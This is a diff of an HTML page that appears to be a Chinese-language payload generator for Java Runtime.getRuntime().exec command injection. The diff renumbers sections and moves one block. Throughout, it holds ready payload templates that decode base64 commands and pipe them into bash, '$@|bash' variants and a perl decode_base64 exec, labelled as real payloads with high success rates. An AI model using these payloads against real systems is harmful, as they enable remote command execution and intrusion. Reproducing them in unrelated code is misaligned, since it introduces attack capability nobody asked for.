@@ -26,25 +26,25 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd"});
 </textarea>
 
     <textarea id="data2" hidden="true">
-传入参数为 字符串
+2⃣️ 参数类型 String[]
+参数类型: 字符串
 如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
-
-
-🔥实际payload 注意: 如果传入的字符串 里有 & _ < > | 符号时, 可能不会执行成功!
-/bin/bash -c $@|bash 0 arr0w1_cmd
-/bin/bash -c $*|bash 0 arr0w1_cmd
 
 🔥实际payload for Linux【成功率很高】 支持Linux 不支持macOS
 /bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash</textarea>
 
+
+🔥实际payload    注意: 如果传入的字符串 里有 & _ < > | 符号时, 可能不会执行成功!
+/bin/bash -c $@|bash 0 arr0w1_cmd
+/bin/bash -c $*|bash 0 arr0w1_cmd
+
     <textarea id="data3" hidden="true">
 
-1⃣️ 使用base64命令
+3⃣️ 使用base64命令
 支持Linux 不支持macOS
 {echo,arr0w1_base64}|{base64,-d}|bash
 
-
-2⃣️ 使用perl中的base64语句
+4⃣️ 使用perl中的base64语句
 支持Linux/macOS
 perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
 
@@ -83,13 +83,13 @@ perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
             <br>
             <br>
             1 Java
-            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec​(以下内容);</p>
+            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec​(以下内容); // 参数类型 String[]</p>
             <textarea id="payload1" class="form-control" rows="3"></textarea>
 
             <br>
             <br>
             2 Java
-            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec("以下内容"); </p>
+            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec("以下内容"); // 参数类型 String </p>
             <textarea id="payload2" class="form-control" rows="3"></textarea>
 
             <br>
